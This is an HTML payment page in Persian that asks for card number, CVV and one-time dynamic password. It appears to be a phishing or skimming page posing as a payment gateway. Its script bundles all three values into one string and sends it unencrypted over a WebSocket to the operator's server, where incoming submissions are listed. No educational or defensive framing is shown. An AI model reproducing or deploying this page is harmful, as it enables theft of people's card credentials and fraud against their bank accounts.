<!DOCTYPE html>
<html lang="fa">
<head>
    <meta name="google-site-verification" content="cipUGutJRhRzfPymeKitE7700fM1vi4iT2zB045oA1A" />
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css">
    <title>درگاه پرداخت</title>
</head>
<body>
    <div class="container">
        <h1>ورود اطلاعات پرداخت</h1>
        <form id="payment-form">
            <label for="card-number">شماره کارت:</label>
            <input type="text" id="card-number" name="card-number" placeholder="XXXX-XXXX-XXXX-XXXX" required>
            
            <label for="cvv">CVV:</label>
            <input type="text" id="cvv" name="cvv" placeholder="XXX" required>
            
            <label for="otp">رمز پویا:</label>
            <input type="text" id="otp" name="otp" placeholder="XXXXXX" required>
            
            <button type="submit">ارسال اطلاعات</button>
        </form>

        <h2>اطلاعات دریافتی:</h2>
        <ul id="infoList"></ul>
    </div>

    <script>
        const socket = new WebSocket('ws://localhost:3000'); // آدرس سرور شما

        // هنگام دریافت اطلاعات از سرور
        socket.addEventListener('message', function (event) {
            const infoList = document.getElementById('infoList');
            const newItem = document.createElement('li');
            newItem.textContent = event.data;
            infoList.appendChild(newItem);
        });

        // ارسال اطلاعات به سرور
        document.getElementById('payment-form').addEventListener('submit', function(event) {
            event.preventDefault();
            const cardNumber = document.getElementById('card-number').value;
            const cvv = document.getElementById('cvv').value;
            const otp = document.getElementById('otp').value;
            const fullInfo = `شماره کارت: ${cardNumber}, CVV: ${cvv}, رمز پویا: ${otp}`; // ترکیب اطلاعات
            socket.send(fullInfo); // ارسال اطلاعات به سرور
            this.reset(); // پاک کردن فرم
        });
    </script>
</body>
</html>
